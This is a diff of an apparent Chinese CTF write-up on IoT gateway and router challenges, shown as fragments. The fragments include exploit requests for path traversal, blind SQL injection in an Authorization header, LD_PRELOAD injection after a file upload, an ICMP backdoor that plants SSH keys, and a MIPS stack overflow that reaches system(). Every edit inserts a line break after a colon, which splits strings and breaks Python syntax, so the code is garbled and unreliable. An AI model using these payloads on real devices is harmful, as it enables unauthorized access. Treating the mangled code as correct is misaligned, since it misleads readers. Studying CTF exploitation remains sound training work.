@@ -461,7 +461,8 @@ def method1():
 
     s.connect((IP, 8080))
 
-    data = “GET /cgi-bin/get.cgi?name=/../../../dev/ttyUSB0 HTTP/1.1rnHost: %srnAuthorization: Basic guest:guestrnrn” % (IP)
+    data = “GET /cgi-bin/get.cgi?name=/../../../dev/ttyUSB0 HTTP/1.1rnHost: %srnAuthorization: Basic guest:
+guestrnrn” % (IP)
 
     s.sendall(data.encode())
 
@@ -483,7 +484,8 @@ def method2():
 
         for k in table:
 
-            data = “GET / HTTP/1.1rnHost: %srnAuthorization: Basic guest’;select Password from User where Name=’admin’ and case when (hex(substr(Password,%s,1))=hex(‘%s’)) then 1 else load_extension(1) end;–:rnrn” % (IP, str(i + 1), k)
+            data = “GET / HTTP/1.1rnHost: %srnAuthorization: Basic guest’;select Password from User where Name=’admin’ and case when (hex(substr(Password,%s,1))=hex(‘%s’)) then 1 else load_extension(1) end;–:
+rnrn” % (IP, str(i + 1), k)
 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -533,7 +535,8 @@ def method3():
 
     content_length = str(146 + len(payload) + len(fixed_name))
 
-    data = b”POST /cgi-bin/upload.cgi HTTP/1.1rnAuthorization: Basic guest:guestrnHost: %srnContent-Length: %srnContent-Type: multipart/form-data; boundary=—-WebKitFormBoundary0WLLWzLToAYE3yy8rnUser-Agent: Mozilla/5.0rnAccept: text/htmlrnConnection: closernrn——WebKitFormBoundary0WLLWzLToAYE3yy8rnContent-Disposition: form-data; name=”file”; filename=”%s”rnrn%srn——WebKitFormBoundary0WLLWzLToAYE3yy8–” % (IP.encode(), content_length.encode(), fixed_name.encode(), payload)
+    data = b”POST /cgi-bin/upload.cgi HTTP/1.1rnAuthorization: Basic guest:
+guestrnHost: %srnContent-Length: %srnContent-Type: multipart/form-data; boundary=—-WebKitFormBoundary0WLLWzLToAYE3yy8rnUser-Agent: Mozilla/5.0rnAccept: text/htmlrnConnection: closernrn——WebKitFormBoundary0WLLWzLToAYE3yy8rnContent-Disposition: form-data; name=”file”; filename=”%s”rnrn%srn——WebKitFormBoundary0WLLWzLToAYE3yy8–” % (IP.encode(), content_length.encode(), fixed_name.encode(), payload)
 
     s.sendall(data)
 
@@ -545,7 +548,8 @@ def method3():
 
     s.connect((IP, 8080))
 
-    data = “GET /cgi-bin/get.cgi HTTP/1.1rnHost: %srnLD_PRELOAD: /usr/bin/upload/PDlZpPmkIzlIaIPrnAuthorization: Basic guest:guestrnrn” % (IP)
+    data = “GET /cgi-bin/get.cgi HTTP/1.1rnHost: %srnLD_PRELOAD: /usr/bin/upload/PDlZpPmkIzlIaIPrnAuthorization: Basic guest:
+guestrnrn” % (IP)
 
     print(data)
 
@@ -597,7 +601,8 @@ start_service() {
 
         procd_open_instance
 
-        procd_set_param command “$PROG” “127.0.0.1:7777”
+        procd_set_param command “$PROG” “127.0.0.1:
+7777”
 
         procd_set_param respawn 3600 2 10000
 
@@ -619,7 +624,8 @@ server { 
 
 listen 59659;
 
-listen [::]:59659;
+listen [::]:
+59659;
 
 location ~* .(ejs|php)$ {
 
@@ -633,7 +639,8 @@ proxy_set_header Host $host;
 
 proxy_set_header Proxy “”;
 
-proxy_pass   http://127.0.0.1:7777;
+proxy_pass   http://127.0.0.1:
+7777;
 
 }
 
@@ -903,7 +910,8 @@ bool __cdecl parseRequest(MaConn_0 *conn, MaPacket_0 *packet)
 
     if ( conn->keepAliveCount > 0 )
 
-      mprStaticAssert(“request.c:192”, “conn->keepAliveCount <= 0”);
+      mprStaticAssert(“request.c:
+192”, “conn->keepAliveCount <= 0”);
 
 LABEL_21:
 
@@ -955,7 +963,8 @@ mprAddDuplicateHash(req->headers, keyBuf, value);
 
               v3 = mprStrdup(req, value);
 
-              valuea = (char *)mprSetName(v3, “request.c:400”);
+              valuea = (char *)mprSetName(v3, “request.c:
+400”);
 
               req->authType = (char *)mprStrTok(valuea, &off_37B90, &tok);
 
@@ -1021,7 +1030,8 @@ mprAddDuplicateHash(req->headers, keyBuf, value);
 
                     if ( req->length < 0 )
 
-                      mprStaticAssert(“request.c:435”, “req->length >= 0”);
+                      mprStaticAssert(“request.c:
+435”, “req->length >= 0”);
 
                     v4 = HIDWORD(req->length);
 
@@ -1297,7 +1307,8 @@ att(ip,port,timekey)
 
 root shell获取和默认密码重置
 
-通过跟第一套固件的文件进行比对，可以发现/etc/inittab文件被修改，在文件末尾加入::askconsole:/usr/libexec/login.sh。默认密码修改可以通过改/etc/shadow文件root后面的密文实现。最后可以使用mksquashfs命令将修改后的文件系统打包。
+通过跟第一套固件的文件进行比对，可以发现/etc/inittab文件被修改，在文件末尾加入::
+askconsole:/usr/libexec/login.sh。默认密码修改可以通过改/etc/shadow文件root后面的密文实现。最后可以使用mksquashfs命令将修改后的文件系统打包。
 
 mksquashfs squashfs-root/ hatlab_gateboard-one-squashfs-rootfs.squashfs -b 256K -comp xz -no-xattrs
 
@@ -1483,7 +1494,8 @@ struct icmp {
 
 LOBYTE(v8[10]) != 8判断了icmp_type是否为echo request，即正常的ping请求，v8[12] == 57005比较了icmp_id是否为57005，这个字段通过构造可以控制，接着将icmp的数据内容作为sub_400A30函数的第一个参数传入，该函数为一个base64解码函数，只是编码表被替换成了Gw6Y/H7PxrieDoRSE58h0fcp1jtlbdON9zKVA2g3+aTCy4XmIBuZUsWJnkMqF。
 
-接着解析数据包中的mac地址，比较是否为eth5网卡的地址，也就是设备wan口的mac地址，这个地址在比赛中很容易获取，即mac地址是根据队伍的序号生成的，如1号队伍的mac地址为00:00:00:00:00:01依次类推。
+接着解析数据包中的mac地址，比较是否为eth5网卡的地址，也就是设备wan口的mac地址，这个地址在比赛中很容易获取，即mac地址是根据队伍的序号生成的，如1号队伍的mac地址为00:00:00:00:00:
+01依次类推。
 
 如果mac地址匹配的话，会将mac地址@后的内容写入到dropbear的authorized_keys中，如果这里控制的内容为ssh公钥的话，就可以通过ssh公钥登录到设备上。由于题目描述了内核中还存在一处后门，因此就不仅仅只分析main二进制这么简单。
 
@@ -1895,7 +1907,8 @@ def icmp_send(dest_addr,pkt_checksum,payload):
 
         my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
 
-    except socket.error, (errno, msg):
+    
+except socket.error, (errno, msg):
 
         if errno == 1:
 
@@ -2111,11 +2124,14 @@ void __cdecl handle_client(int client_sock)
 
 通过 username 参数覆盖栈溢出$ra寄存器，跳转到0x400AE8，再通过password 覆盖 $fp 成 0x410C84 地址，
 
-.text:00400AE8                 addiu   $v0, $fp, 0x438+username
+.text:
+00400AE8                 addiu   $v0, $fp, 0x438+username
 
-.text:00400AEC                 move    $a0, $v0         # cmd
+.text:
+00400AEC                 move    $a0, $v0         # cmd
 
-.text:00400AF0                 jal     secret_function
+.text:
+00400AF0                 jal     secret_function
 
 0x410C84-0x42c=0x04110B0（cat /dev/ttyUSB0 地址），此时当作secret_function函数的参数，最终传给system函数并执行。
 
@@ -2139,7 +2155,8 @@ def main():
 
         con.connect((remote_ip,int(remote_port)))
 
-    except Exception as e:
+    
+except Exception as e:
 
         print(e)
 
@@ -2163,7 +2180,8 @@ def main():
 
             d = con.recv(1024)
 
-        except:
+        
+except:
 
             break
 
@@ -2187,7 +2205,9 @@ pbk
 
 鉴权部分使用了本地配置文件 /etc/accounts.ini，账户格式为
 
-username:hash_password:role|
+username:
+hash_password:
+role|
 
 role 字段定义了该用户的角色，guest 为访客，admin 为管理员。默认状态下存在两个用户，guest 和 admin，通过查询 guest 的 md5 密码可知也为 guest。通过身份验证之后程序会返回一 sessionid
 
@@ -2215,7 +2235,8 @@ def auth_check(self, session_id):
 
             return _session.role
 
-        except:
+        
+except:
 
             return False
 
@@ -2289,7 +2310,8 @@ get_version 功能存在任意文件读取，可以直接获取 flag，而 uploa
 
 后端中 admin 账户可以调用调试功能，直接执行系统命令，但是 admin 的密码无法破解出来。不过我们分析前后端 json 处理的过程
 
-bool Request::ParseRequest(char* raw_data){
+bool Request::
+ParseRequest(char* raw_data){
 
     JsonHelper* json_helper = new JsonHelper();
 
@@ -2377,7 +2399,8 @@ def method2():
 
         exit(0)
 
-    backend1 = ‘NOVA00010102{“session_id”:”%s”,”func”:18,”f”:112,”o”:”/../../dev/ttyUSB0″}’ % guest_session_id
+    backend1 = ‘NOVA00010102{“session_id”:”%s”,”func”:18,”f”:
+112,”o”:”/../../dev/ttyUSB0″}’ % guest_session_id
 
     s.sendall(backend1.encode())
 
@@ -2457,9 +2480,11 @@ required uint64 opcode = 2;
 
 程序中主要使用了 id 字段，当 id 等于 3 时，程序会利用蓝牙芯片扫描附近的 BLE 信号。
 
-.text:00400EEC                 jal     system
+.text:
+00400EEC                 jal     system
 
-.text:00400EF0                 nop
+.text:
+00400EF0                 nop
 
 from pwn import *
 
